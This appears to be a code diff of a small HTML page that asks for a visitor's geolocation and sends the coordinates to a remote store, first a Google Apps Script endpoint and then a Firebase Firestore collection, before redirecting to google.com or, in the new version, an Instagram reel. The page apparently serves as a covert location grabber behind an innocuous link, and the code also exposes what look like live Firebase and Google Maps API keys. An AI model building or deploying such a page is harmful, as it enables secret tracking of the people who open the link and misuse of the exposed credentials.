@@ -1,78 +1,55 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Your Location on Google Maps</title>
-  <style>
-    body {
-      font-family: sans-serif;
-      margin: 0;
-      padding: 0;
-      text-align: center;
-    }
-    #map {
-      height: 80vh;
-      width: 100%;
-    }
-    #coords {
-      font-size: 18px;
-      margin: 10px 0;
-    }
-  </style>
+  <title>Log Location</title>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-app-compat.js"></script>
+  <script src="https://www.gstatic.com/firebasejs/10.12.0/firebase-firestore-compat.js"></script>
 </head>
 <body>
-
-<h2>Your Current Location</h2>
+<h2>Logging your location...</h2>
 <div id="coords">Fetching location...</div>
-<div id="map"></div>
-
-
 
 <script>
-  function initMap() {
-    if (navigator.geolocation) {
-      navigator.geolocation.getCurrentPosition(
-        function (position) {
-          const lat = position.coords.latitude;
-          const lng = position.coords.longitude;
+  // ✅ Replace this with your actual Firebase config
+  const firebaseConfig = {
+  apiKey: "AIzaSyDgO0EMocR1LmOQFwFCvCU7QyMeAieuruA",
+  authDomain: "location-logger-53d22.firebaseapp.com",
+  projectId: "location-logger-53d22",
+  storageBucket: "location-logger-53d22.firebasestorage.app",
+  messagingSenderId: "822436256718",
+  appId: "1:822436256718:web:4f026aa17bef44c71f699f"
+};
 
-          // Display coordinates
-          document.getElementById("coords").textContent =
-            `Latitude: ${lat.toFixed(6)}, Longitude: ${lng.toFixed(6)}`;
+  firebase.initializeApp(firebaseConfig);
+  const db = firebase.firestore();
 
-          // Send to Google Apps Script
-          fetch("https://script.google.com/macros/s/AKfycbzOS29_yZzsIwDtmQ8CCH-BwYGTSbKUBU3X4rLQnPE/dev", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ lat, lng }),
-          })
-          .then(() => {
-            // ✅ Wait 10 seconds, then redirect
-            setTimeout(() => {
-              window.location.href = "https://www.google.com/";
-            }, 10000); // 10 seconds = 10000 ms
-          })
-          .catch(err => {
-            console.error("Error logging location:", err);
-            window.location.href = "https://www.google.com/";
-          });
-        },
-        function () {
-          document.getElementById("coords").textContent = "Location access denied.";
-        }
-      );
-    } else {
-      document.getElementById("coords").textContent = "Geolocation not supported.";
+  navigator.geolocation.getCurrentPosition(
+    function (position) {
+      const lat = position.coords.latitude;
+      const lng = position.coords.longitude;
+      const timestamp = new Date().toISOString();
+
+      document.getElementById("coords").innerText =
+        `Lat: ${lat}, Lng: ${lng}`;
+
+      db.collection("locations").add({
+        lat,
+        lng,
+        timestamp
+      }).then(() => {
+        // ✅ Wait 10 seconds then redirect
+        setTimeout(() => {
+          window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+        }, 10000);
+      }).catch((err) => {
+        console.error("Logging failed", err);
+        window.location.href = "https://www.instagram.com/reel/DKYwX7Izaf1";
+      });
+    },
+    function () {
+      alert("Location access denied.");
     }
-  }
+  );
 </script>
-
-
-
-
-<!-- Replace YOUR_API_KEY with your actual key -->
-<script async defer
-  src="https://maps.googleapis.com/maps/api/js?key=AIzaSyAq1aUgx0YxAXOapEb8iKljX2P3wL0pcEk&callback=initMap">
-</script>
-
 </body>
 </html>
